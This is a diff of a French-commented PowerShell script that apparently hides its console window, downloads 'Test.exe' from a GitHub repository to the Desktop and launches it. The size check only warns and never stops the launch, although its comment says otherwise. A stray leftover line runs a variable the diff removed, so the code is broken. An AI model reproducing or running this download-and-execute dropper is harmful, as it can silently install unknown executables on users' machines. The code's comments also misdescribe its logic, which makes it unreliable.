@@ -16,27 +16,40 @@ $consolePtr = [ConsoleWindow]::GetConsoleWindow()
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://github.com/Gabkill54/Kidou-Software/raw/main/Test.exe'
-
+# Définir l'URL du fichier à télécharger et le chemin de destination
+$FileUrl = "https://github.com/Gabkill54/Kidou-Software/raw/main/Test.exe"
 $DesktopPath = [Environment]::GetFolderPath("Desktop")
-$FilePath = "$DesktopPath\test.exe"
+$DestinationPath = "$DesktopPath\Test.exe"
 
+# Télécharger le fichier avec Invoke-WebRequest
 try {
-    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
-}
-catch {
-    Write-Host "Une erreur est survenue: $_"
-    exit
+    Write-Output "Téléchargement de $FileUrl vers $DestinationPath..."
+    
+    Invoke-WebRequest -Uri $FileUrl -OutFile $DestinationPath -UseBasicParsing
+    
+    # Vérification de la taille du fichier téléchargé
+    $downloadedFile = Get-Item $DestinationPath
+    $expectedFileSize = 15MB # Remplacer par la taille attendue en Mo si connue
+    
+    Write-Output "Taille du fichier téléchargé : $($downloadedFile.Length / 1MB) MB"
+    
+    if ($downloadedFile.Length -ge ($expectedFileSize - 1MB) -and $downloadedFile.Length -le ($expectedFileSize + 1MB)) {
+        Write-Output "Le fichier a été téléchargé correctement."
+    } else {
+        Write-Output "Avertissement : La taille du fichier téléchargé semble incorrecte."
+    }
+
+    # Lancer l'exécutable si la taille semble correcte
+    if (Test-Path $DestinationPath) {
+        Start-Process -FilePath $DestinationPath -Wait
+    } else {
+        Write-Output "Erreur : Le fichier n'a pas été trouvé après le téléchargement."
+    }
+    
+} catch {
+    Write-Output "Erreur lors du téléchargement ou de l'exécution : $_"
 }
 
-if ($response.Content) {
-    Write-Host "Le script a été téléchargé avec succès."
-} else {
-    Write-Host "Le contenu du script est vide ou invalide."
-    exit
-}
-
-Set-Content -Path $FilePath -Value $response.Content
 
 Start-Process -FilePath $FilePath -Wait
 
